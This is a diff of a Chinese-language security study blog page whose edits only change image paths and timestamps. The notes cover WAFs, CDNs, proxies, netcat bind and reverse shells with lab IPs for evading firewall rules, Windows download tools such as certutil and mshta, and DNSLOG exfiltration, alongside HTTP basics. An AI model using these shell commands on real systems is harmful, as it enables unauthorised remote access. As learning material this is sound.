@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zn_CN">
 <meta property="og:image" content="http://example.com/img/preview.jpg">
 <meta property="article:published_time" content="2025-05-11T05:56:38.000Z">
-<meta property="article:modified_time" content="2025-05-11T06:02:50.516Z">
+<meta property="article:modified_time" content="2025-05-11T06:15:03.300Z">
 <meta property="article:author" content="GoldY">
 <meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary">
@@ -158,7 +158,7 @@
 <p>​		默认情况下，使用phpstudy搭建获得的webshell的权限较大</p>
 <p>​		使用灯塔搭建的网站，具有一定的安全机制</p>
 <h2 id="使用WAF搭建"><a href="#使用WAF搭建" class="headerlink" title="使用WAF搭建"></a>使用WAF搭建</h2><p>WAF：WEB应用防火墙</p>
-<p><img src="/./images/image-20250420102628560.png" alt="image-20250420102628560"></p>
+<p><img src="/img/xiaodi/image-20250420102628560.png" alt="image-20250420102628560"></p>
 <p>影响：</p>
 <p>​	常规的渗透方法可能被拦截，需要使用绕过WAF手法进行绕过</p>
 <h2 id="使用CDN"><a href="#使用CDN" class="headerlink" title="使用CDN"></a>使用CDN</h2><p>原理：内容分发服务，用户访问Web网站提供多地域响应，提高访问速度</p>
@@ -176,10 +176,10 @@
 <p><img src="https://pic2.zhimg.com/v2-8c1cfe007a2b5b64d221a20a335a9333_1440w.jpg" alt="img"></p>
 <p>正反向代理</p>
 <h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理是一种位于客户端和原始服务器之间的服务器，它接收客户端的请求并将其转发给原始服务器，然后将服务器的响应返回给客户端（不代理不可达）</p>
-<p><img src="/./images/image-20250420104147752.png" alt="image-20250420104147752"></p>
+<p><img src="/img/xiaodi/image-20250420104147752.png" alt="image-20250420104147752"></p>
 <p>​	</p>
 <h3 id="2反向代理"><a href="#2反向代理" class="headerlink" title="2反向代理"></a>2反向代理</h3><p>通过网络反向代理转发真实服务达到访问目的影响：访问目标只是一个代理，非真实应用服务器</p>
-<p><img src="/./images/image-20250420104426621.png" alt="image-20250420104426621"></p>
+<p><img src="/img/xiaodi/image-20250420104426621.png" alt="image-20250420104426621"></p>
 <p>原理：通过网络反向代理转发真实服务达到访问目的影响：访问目标只是一个代理，非真实应用服务器</p>
 <p>注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！</p>
 <h1 id="APP应用开发架构"><a href="#APP应用开发架构" class="headerlink" title="APP应用开发架构"></a>APP应用开发架构</h1><p>1、原生开发</p>
@@ -215,19 +215,19 @@
 <p>①正向连接：</p>
 <p>Linux： nc 192.168.138.130 5566</p>
 <p>windows：nc -e cmd -lvvp 5566</p>
-<img src="./images/image-20250420163653315.png" alt="image-20250420163653315" style="zoom: 50%;" />
+<img src="/img/xiaodi/image-20250420163653315.png" alt="image-20250420163653315" style="zoom: 50%;" />
 
 <p>②反向连接：</p>
 <p>Linux： nc -lvvp 5566</p>
 <p>Windows：nc -e cmd 192.168.138.141 5566</p>
-<img src="./images/image-20250420164123747.png" alt="image-20250420164123747" style="zoom:50%;" />
+<img src="/img/xiaodi/image-20250420164123747.png" alt="image-20250420164123747" style="zoom:50%;" />
 
 <h2 id="防火墙出入站"><a href="#防火墙出入站" class="headerlink" title="防火墙出入站"></a>防火墙出入站</h2><p>①当防火墙入站规则被进行过滤</p>
 <p>阻止5566端口的入站规则</p>
 <p>思路：攻击者监听本地端口，客户端主动连接攻击者</p>
 <p>client：nc.exe -e cmd 192.168.138.141 5566</p>
 <p>hacker：nc -lvvp 5566</p>
-<img src="./images/image-20250420165620592.png" alt="image-20250420165620592" style="zoom:50%;" />
+<img src="/img/xiaodi/image-20250420165620592.png" alt="image-20250420165620592" style="zoom:50%;" />
 
 
 
@@ -237,7 +237,7 @@
 <p>思路：客户端监听本地端口，攻击者主动连接客户端</p>
 <p>client：nc.exe -e cmd -lvvp 5566</p>
 <p>hacker：nc 192.168.138.132 5566	</p>
-<p><img src="/./images/image-20250420170553445.png" alt="image-20250420170553445"></p>
+<p><img src="/img/xiaodi/image-20250420170553445.png" alt="image-20250420170553445"></p>
 <h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p>文件下载命令生成：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
 <p>Linux：wget curl python ruby perl java 等</p>
 <p>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等</p>
@@ -254,7 +254,7 @@
 
 
 
-<h1 id="数据不回显"><a href="#数据不回显" class="headerlink" title="数据不回显"></a>数据不回显</h1><p><img src="/./images/image-20250420173346329.png" alt="image-20250420173346329"></p>
+<h1 id="数据不回显"><a href="#数据不回显" class="headerlink" title="数据不回显"></a>数据不回显</h1><p><img src="/img/xiaodi/image-20250420173346329.png" alt="image-20250420173346329"></p>
 <p>使用数据访问外部DNSLOG的方式外带</p>
 <p>常用dnslog：</p>
 <ul>
@@ -328,7 +328,7 @@
 <p>有时为了保护源代码可能会对代码进行二次加密</p>
 <p><a target="_blank" rel="noopener" href="https://www.phpencode.cn/free_sg">千古互动 免费PHP加密 - SG11,SG13,SG14,SG15,Phpencode.cn,SG11加密平台,PHP加密平台,免费PHP加密,PHP在线加密</a></p>
 <p><a target="_blank" rel="noopener" href="https://yours.tools/zh/enphp.html">php在线混淆加密,支持php5和php7代码在线加密混淆-在线工具网</a></p>
-<p><img src="/./images/1745501662219.png" alt="1745501662219"></p>
+<p><img src="/img/xiaodi/1745501662219.png" alt="1745501662219"></p>
 <h3 id="逆向思路"><a href="#逆向思路" class="headerlink" title="逆向思路"></a>逆向思路</h3><p>1、看密文的特征分析算法</p>
 <p>2、获取源码分析算法（后端加密）</p>
 <p>3、JS前端进行加密（前端加密）</p>
@@ -360,7 +360,7 @@
 
 <p>XML是一种可扩展的标记语言，用于描述和传输结构化数据，常用于Web服务和配置文件中。它具有自我描述性和可扩展性，适用于复杂数据结构和文档的交换。然而，XML标签冗余，数据体积较大，解析和生成相对复杂。</p>
 <h1 id="HTTP数据包"><a href="#HTTP数据包" class="headerlink" title="HTTP数据包"></a>HTTP数据包</h1><h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>利用HTTP访问网站都有哪些请求方法，请求方法对应特点？<br>GET: 		直接获取网站资源<br>POST：		客户端有信息要提交到服务端时（登录 搜索）<br>HEAD:		类似GET方法，不会返回响应主体信息<br>PUT：		用来将本地资源上传到服务端<br>OPTIONS:	用来检测服务端可以接收哪些访问请求（安全）<br>TRACE:		可以在响应报文中，看到请求报文的内容	</p>
-<h2 id="HTTP请求报文信息"><a href="#HTTP请求报文信息" class="headerlink" title="HTTP请求报文信息"></a>HTTP请求报文信息</h2><img src="./images/image-20250506205343605.png" alt="image-20250506205343605" style="zoom:50%;" />
+<h2 id="HTTP请求报文信息"><a href="#HTTP请求报文信息" class="headerlink" title="HTTP请求报文信息"></a>HTTP请求报文信息</h2><img src="/img/xiaodi/image-20250506205343605.png" alt="image-20250506205343605" style="zoom:50%;" />
 
 <p><strong>第一部分：请求行信息</strong><br>1）请求方法信息：GET POST PUT HEAD …<br>2）请求资源信息：<br>   host（访问网站域名&#x2F;地址&#x2F;端口）+请求资源<br>   host: 确认访问站点目录<br>   请求资源：三种情况<br>   1 正常请求资源- oldboy.jpg<br>   2 默认请求-&#x2F; &#x2F;admin&#x2F; 请求首页文件-index.html index.php index.jsp<br>   3 访问代码资源需要传入参数</p>
 <p>   协议（HTTP&#x2F;HTTPS&#x2F;FTP）+host（访问网站域名&#x2F;地址&#x2F;端口）+请求资源  – 请求信息 &#x3D;&#x3D; URL</p>
@@ -394,7 +394,7 @@
 <p>   常用状态有什么：面试问到<br>   100 Continue：			表示服务端收到了客户端的请求信息（POST），但是没有收到请求主体信息<br>   200 OK:					本状态码表示已成功提交请求，且响应主体中包含请求结果。<br>   201 Created:				客户端进行PUT请求时，有数据文件上传到服务端成功后，会响应201状态码信息<br>   301 Moved Permanently：	本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。<br>   302 Found				本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.<br>    PS：网站页面跳转，可以对协议 对域名 对资源信息做跳转处理，以便用户在访问旧的资源信息时，可以获取到新的资源信息<br>   304 Not Modified。       本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与工If-None-Match消息头确定客户端是否拥有最新版本的资源。</p>
 <p>   401 Unauthorized.		服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。<br>                            参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/chj_1224365967/article/details/113946038">https://blog.csdn.net/chj_1224365967/article/details/113946038</a><br>                            第一步：编写配置文件<br>                            第二步：创建用户密码文件<br>                            第三步：重启nginx							<br> 403 Forbidden			本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。<br>                            参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yxhxj2006/article/details/121623574">https://blog.csdn.net/yxhxj2006/article/details/121623574</a><br>                            访问首页文件不存在，也会出现此状态码<br> 404 Not Found。			本状态码表示所请求的资源并不存在。<br> 405 Method Not Allowed	本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。<br>                            服务端做了请求方法限制</p>
 <p>   500 Internal Server Error	本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。<br>                                应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。<br>                                PS：检查访问网站代码逻辑（代码审计）<br> 503 Service Unavailable。	通常，本状态码表示尽管Web服务器运转正常.并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。<br>   502                          PS：需要访问后端数据库服务，但是后端数据库服务没有响应</p>
-<p><strong>第二个部分：响应头信息</strong><br><img src="/./images/image-20250506205521065.png" alt="image-20250506205521065"></p>
+<p><strong>第二个部分：响应头信息</strong><br><img src="/img/xiaodi/image-20250506205521065.png" alt="image-20250506205521065"></p>
 <p><strong>第三个部分：响应主体信息</strong><br>响应HTML代码信息，浏览器识别HTML代码加载页面</p>
 <h2 id="跨平台测试注意事项"><a href="#跨平台测试注意事项" class="headerlink" title="跨平台测试注意事项"></a>跨平台测试注意事项</h2><p>在不同终端测试时，必须保证数据包结构与目标平台完全一致</p>
 <p>eg.不同的设备访问同一web界面返回不一致</p>
@@ -463,4 +463,4 @@
         </li>
       
     </ul>
-  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Website Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article Count :</div><div class="item-count">2</div></div><div class="webinfo-item"><div class="item-name">Unique Visitors :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Page Views :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Update :</div><div class="item-count" id="last-push-date" data-lastPushDate="2025-05-11T06:03:08.976Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By GoldY</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Website Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article Count :</div><div class="item-count">2</div></div><div class="webinfo-item"><div class="item-name">Unique Visitors :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Page Views :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Update :</div><div class="item-count" id="last-push-date" data-lastPushDate="2025-05-11T06:15:15.575Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By GoldY</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
